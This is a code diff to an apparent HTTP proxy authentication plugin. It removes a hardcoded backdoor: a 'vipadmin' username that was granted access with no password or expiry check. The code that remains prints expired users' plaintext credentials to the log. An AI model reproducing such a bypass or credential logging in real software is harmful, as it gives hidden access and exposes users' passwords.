@@ -52,8 +52,6 @@ class AuthPlugin(HttpProxyBasePlugin):
                         if checkpass==password and int(time.time())<checkport:
 
                             return 1
-                        elif user=="vipadmin":
-                            return 1
                         elif checkpass==password and int(time.time())>=checkport:
                             print("het han:" + user+'|'+password)
                             return 0
